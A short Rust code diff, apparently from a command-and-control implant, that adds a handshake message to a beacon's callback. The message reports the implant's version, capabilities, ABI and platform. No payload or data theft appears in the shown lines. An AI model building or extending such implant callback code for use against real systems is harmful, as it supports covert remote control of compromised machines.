@@ -150,6 +150,13 @@ pub fn open_callback(
             agent_id,
             suite,
             meta,
+            &link::Hello {
+                version: wire::HELLO_VERSION,
+                caps: crate::task::capabilities().into_iter().map(upk::s).collect(),
+                implant_version: crate::beacon::VERSION.to_string(),
+                abi: wire::ABI_VERSION,
+                platform: crate::beacon::hello_platform(),
+            },
         )?
     };
     let stream = hs.stream.ok_or("the tunnel channel gave up the socket")?;
